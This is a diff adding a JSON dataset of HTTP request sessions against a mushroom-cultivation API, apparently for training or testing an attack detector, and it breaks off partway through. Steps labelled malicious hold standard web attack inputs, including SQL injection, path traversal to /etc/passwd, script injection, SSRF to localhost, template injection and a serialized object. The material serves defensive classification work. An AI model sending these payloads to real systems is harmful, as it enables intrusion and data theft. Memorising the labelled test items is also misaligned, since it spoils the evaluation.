@@ -1,0 +1,5985 @@
+[
+  {
+    "session_id": "sess101",
+    "client_ip": "192.168.1.10",
+    "steps": [
+      {
+        "id": "sess101-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "mycologist1@example.com",
+          "password": "securepassword123"
+        },
+        "note": "The user logs into their account to initiate a new session."
+      },
+      {
+        "id": "sess101-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1Ni..."
+        },
+        "body": null,
+        "note": "The client requests the current user profile information."
+      },
+      {
+        "id": "sess101-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {
+          "status": "active"
+        },
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1Ni..."
+        },
+        "body": null,
+        "note": "The user lists all active substrate tubs."
+      },
+      {
+        "id": "sess101-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_98765",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1Ni..."
+        },
+        "body": null,
+        "note": "The client views details for a specific substrate tub they own."
+      },
+      {
+        "id": "sess101-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_12345",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1Ni..."
+        },
+        "body": null,
+        "note": "The client checks a second object ID they plausibly own as part of regular work."
+      }
+    ]
+  },
+  {
+    "session_id": "sess102",
+    "client_ip": "10.0.0.5",
+    "steps": [
+      {
+        "id": "sess102-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "Golden Teacher's"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The query includes an apostrophe in the strain search term."
+      },
+      {
+        "id": "sess102-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_01",
+        "query": {},
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client retrieves details for a public mushroom strain."
+      },
+      {
+        "id": "sess102-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/register",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "newuser@example.com",
+          "password": "password456"
+        },
+        "note": "A new user registers an account."
+      },
+      {
+        "id": "sess102-s04",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "newuser@example.com",
+          "password": "password456"
+        },
+        "note": "The newly registered user logs in."
+      }
+    ]
+  },
+  {
+    "session_id": "sess103",
+    "client_ip": "172.16.0.22",
+    "steps": [
+      {
+        "id": "sess103-s01",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "' OR '1'='1"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client performs a query injection attack via the search parameter."
+      },
+      {
+        "id": "sess103-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token123"
+        },
+        "body": null,
+        "note": "The user checks their cultivation summary statistics."
+      },
+      {
+        "id": "sess103-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token123"
+        },
+        "body": null,
+        "note": "The user lists their substrate tubs after the previous request."
+      },
+      {
+        "id": "sess103-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token123"
+        },
+        "body": null,
+        "note": "The client inspects their user profile details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess104",
+    "client_ip": "203.0.113.50",
+    "steps": [
+      {
+        "id": "sess104-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user4@example.com",
+          "password": "mypassword"
+        },
+        "note": "The client logs into the application."
+      },
+      {
+        "id": "sess104-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token4"
+        },
+        "body": null,
+        "note": "The user requests a list of all their substrate tubs."
+      },
+      {
+        "id": "sess104-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token4",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "Tub Alpha\nand beta notes",
+          "strainId": "strain_01"
+        },
+        "note": "The request body contains a newline that continues a sentence in the name field."
+      },
+      {
+        "id": "sess104-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks public mushroom strains."
+      }
+    ]
+  },
+  {
+    "session_id": "sess105",
+    "client_ip": "198.51.100.14",
+    "steps": [
+      {
+        "id": "sess105-s01",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client browses available strains."
+      },
+      {
+        "id": "sess105-s02",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/tubs/tub_99999/../../admin/config",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token5"
+        },
+        "body": null,
+        "note": "The client attempts a directory traversal attack via the path."
+      },
+      {
+        "id": "sess105-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token5"
+        },
+        "body": null,
+        "note": "The client continues with a normal profile request."
+      },
+      {
+        "id": "sess105-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token5"
+        },
+        "body": null,
+        "note": "The client checks their stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess106",
+    "client_ip": "192.0.2.88",
+    "steps": [
+      {
+        "id": "sess106-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user6@example.com",
+          "password": "password6"
+        },
+        "note": "The user logs into the system."
+      },
+      {
+        "id": "sess106-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token6"
+        },
+        "body": null,
+        "note": "The user retrieves their list of tubs."
+      },
+      {
+        "id": "sess106-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token6",
+          "Content-Type": "application/json",
+          "X-Extra-Field": "harmless_value"
+        },
+        "body": {
+          "name": "Beta Tub",
+          "strainId": "strain_02",
+          "substrateType": "coco coir"
+        },
+        "note": "The request includes a harmless extra custom header."
+      },
+      {
+        "id": "sess106-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token6"
+        },
+        "body": null,
+        "note": "The client checks summary statistics."
+      }
+    ]
+  },
+  {
+    "session_id": "sess107",
+    "client_ip": "10.10.10.10",
+    "steps": [
+      {
+        "id": "sess107-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token7",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "<script>alert(1)</script>",
+          "strainId": "strain_01"
+        },
+        "note": "The client sends browser-executed code in the tub name field."
+      },
+      {
+        "id": "sess107-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token7"
+        },
+        "body": null,
+        "note": "The user lists their tubs after the injection attempt."
+      },
+      {
+        "id": "sess107-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token7"
+        },
+        "body": null,
+        "note": "The user views their profile details."
+      },
+      {
+        "id": "sess107-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token7"
+        },
+        "body": null,
+        "note": "The user reviews summary stats."
+      }
+    ]
+  },
+  {
+    "session_id": "sess108",
+    "client_ip": "172.20.10.5",
+    "steps": [
+      {
+        "id": "sess108-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user8@example.com",
+          "password": "password8"
+        },
+        "note": "The user authenticates successfully."
+      },
+      {
+        "id": "sess108-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token8"
+        },
+        "body": null,
+        "note": "The user lists their cultivation tubs."
+      },
+      {
+        "id": "sess108-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_100",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token8",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+        },
+        "body": null,
+        "note": "The client uses an old browser user-agent string."
+      },
+      {
+        "id": "sess108-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_100/logs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token8"
+        },
+        "body": null,
+        "note": "The user checks the growth logs for the tub."
+      }
+    ]
+  },
+  {
+    "session_id": "sess109",
+    "client_ip": "192.168.0.50",
+    "steps": [
+      {
+        "id": "sess109-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user9@example.com",
+          "password": "password9"
+        },
+        "note": "The user logs into their account."
+      },
+      {
+        "id": "sess109-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token9"
+        },
+        "body": null,
+        "note": "The user views their substrate tubs."
+      },
+      {
+        "id": "sess109-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token9",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "My Tub",
+          "strainId": "strain_01",
+          "substrateType": "http://127.0.0.1/internal"
+        },
+        "note": "The client references an internal address in the substrateType field."
+      },
+      {
+        "id": "sess109-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token9"
+        },
+        "body": null,
+        "note": "The user requests their statistics summary after the malicious action."
+      }
+    ]
+  },
+  {
+    "session_id": "sess110",
+    "client_ip": "10.0.0.99",
+    "steps": [
+      {
+        "id": "sess110-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "X-Note": "Using a technical word like proxy in header conversation."
+        },
+        "body": null,
+        "note": "The request mentions a technical word that is only mentioned."
+      },
+      {
+        "id": "sess110-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_01",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks strain details."
+      },
+      {
+        "id": "sess110-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user10@example.com",
+          "password": "password10"
+        },
+        "note": "The user logs into the application."
+      },
+      {
+        "id": "sess110-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token10"
+        },
+        "body": null,
+        "note": "The client retrieves their profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess111",
+    "client_ip": "192.168.2.15",
+    "steps": [
+      {
+        "id": "sess111-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user11@example.com",
+          "password": "password11"
+        },
+        "note": "User logs in to start session."
+      },
+      {
+        "id": "sess111-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token11"
+        },
+        "body": null,
+        "note": "User fetches tubs."
+      },
+      {
+        "id": "sess111-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token11",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "{{7*7}}",
+          "strainId": "strain_01"
+        },
+        "note": "The client submits a template expression in the name field."
+      },
+      {
+        "id": "sess111-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token11"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess112",
+    "client_ip": "172.16.5.10",
+    "steps": [
+      {
+        "id": "sess112-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user12@example.com",
+          "password": "password12"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess112-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token12"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess112-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token12",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "SerializedTub",
+          "strainId": "strain_01",
+          "substrateType": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldKs="
+        },
+        "note": "The client includes a serialized object payload in the substrateType field."
+      },
+      {
+        "id": "sess112-s04",
+        "label": "benign",
+        "method": "DELETE",
+        "path": "/v1/tubs/tub_12",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token12"
+        },
+        "body": null,
+        "note": "User deletes a tub."
+      }
+    ]
+  },
+  {
+    "session_id": "sess113",
+    "client_ip": "10.0.1.20",
+    "steps": [
+      {
+        "id": "sess113-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user13@example.com",
+          "password": "password13"
+        },
+        "note": "User authenticates."
+      },
+      {
+        "id": "sess113-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token13"
+        },
+        "body": null,
+        "note": "User retrieves tubs."
+      },
+      {
+        "id": "sess113-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token13",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "Normal Tub\n[2026-03-29T10:00:00Z] ADMIN_OVERRIDE",
+          "strainId": "strain_01"
+        },
+        "note": "The client appends a newline plus a log stamp in the name field."
+      },
+      {
+        "id": "sess113-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token13"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess114",
+    "client_ip": "192.168.10.5",
+    "steps": [
+      {
+        "id": "sess114-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token14",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "PrivilegeTub",
+          "strainId": "strain_01",
+          "isAdmin": true
+        },
+        "note": "The client includes a privilege field that is not in the contract."
+      },
+      {
+        "id": "sess114-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token14"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess114-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token14"
+        },
+        "body": null,
+        "note": "User gets stats."
+      },
+      {
+        "id": "sess114-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token14"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess115",
+    "client_ip": "172.30.0.12",
+    "steps": [
+      {
+        "id": "sess115-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user15@example.com",
+          "password": "password15"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess115-s02",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_other_999",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token15"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess115-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token15"
+        },
+        "body": null,
+        "note": "User lists their own tubs."
+      },
+      {
+        "id": "sess115-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token15"
+        },
+        "body": null,
+        "note": "User views profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess116",
+    "client_ip": "10.5.5.5",
+    "steps": [
+      {
+        "id": "sess116-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user16@example.com",
+          "password": "password16"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess116-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token16"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess116-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/admin/dashboard",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token16"
+        },
+        "body": null,
+        "note": "The client accesses an admin path that is not in the contract."
+      },
+      {
+        "id": "sess116-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token16"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess117",
+    "client_ip": "192.168.1.100",
+    "steps": [
+      {
+        "id": "sess117-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user17@example.com",
+          "password": "password17"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess117-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token17"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess117-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_17",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token17"
+        },
+        "body": null,
+        "note": "User views tub details."
+      },
+      {
+        "id": "sess117-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_17/logs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token17"
+        },
+        "body": null,
+        "note": "User lists tub logs."
+      },
+      {
+        "id": "sess117-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_18",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token17"
+        },
+        "body": null,
+        "note": "User checks a second object id they own as normal work."
+      }
+    ]
+  },
+  {
+    "session_id": "sess118",
+    "client_ip": "10.0.2.15",
+    "steps": [
+      {
+        "id": "sess118-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "B+ strain\nrecommended"
+        },
+        "headers": {},
+        "body": null,
+        "note": "Query contains a newline that continues a sentence."
+      },
+      {
+        "id": "sess118-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_05",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "Client retrieves strain details."
+      },
+      {
+        "id": "sess118-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user18@example.com",
+          "password": "password18"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess118-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token18"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess119",
+    "client_ip": "172.16.1.50",
+    "steps": [
+      {
+        "id": "sess119-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user19@example.com",
+          "password": "password19"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess119-s02",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token19",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "InjectedQuery' OR '1'='1",
+          "strainId": "strain_01"
+        },
+        "note": "The client performs query injection in the tub name field."
+      },
+      {
+        "id": "sess119-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token19"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess119-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token19"
+        },
+        "body": null,
+        "note": "User views summary stats."
+      }
+    ]
+  },
+  {
+    "session_id": "sess120",
+    "client_ip": "192.168.5.20",
+    "steps": [
+      {
+        "id": "sess120-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user20@example.com",
+          "password": "password20"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess120-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token20"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess120-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token20",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "My Tub",
+          "strainId": "strain_01",
+          "debugMode": false
+        },
+        "note": "Request includes a harmless extra field in body."
+      },
+      {
+        "id": "sess120-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token20"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess121",
+    "client_ip": "10.0.3.33",
+    "steps": [
+      {
+        "id": "sess121-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user21@example.com",
+          "password": "password21"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess121-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token21"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess121-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/logs/log_unauthorized_999",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token21"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess121-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token21"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess122",
+    "client_ip": "172.16.2.88",
+    "steps": [
+      {
+        "id": "sess122-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user22@example.com",
+          "password": "password22"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess122-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token22"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess122-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/admin/users",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token22"
+        },
+        "body": null,
+        "note": "The client accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess122-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token22"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess123",
+    "client_ip": "192.168.1.55",
+    "steps": [
+      {
+        "id": "sess123-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user23@example.com",
+          "password": "password23"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess123-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token23"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess123-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token23",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "DirectoryTub",
+          "strainId": "strain_01",
+          "substrateType": "../../../etc/passwd"
+        },
+        "note": "The client performs directory traversal via substrateType field."
+      },
+      {
+        "id": "sess123-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token23"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess124",
+    "client_ip": "10.0.4.12",
+    "steps": [
+      {
+        "id": "sess124-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user24@example.com",
+          "password": "password24"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess124-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token24"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess124-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token24",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "<svg/onload=alert(document.domain)>",
+          "strainId": "strain_01"
+        },
+        "note": "The client executes browser code via svg onload."
+      },
+      {
+        "id": "sess124-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token24"
+        },
+        "body": null,
+        "note": "User views profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess125",
+    "client_ip": "172.18.0.5",
+    "steps": [
+      {
+        "id": "sess125-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user25@example.com",
+          "password": "password25"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess125-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token25"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess125-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token25",
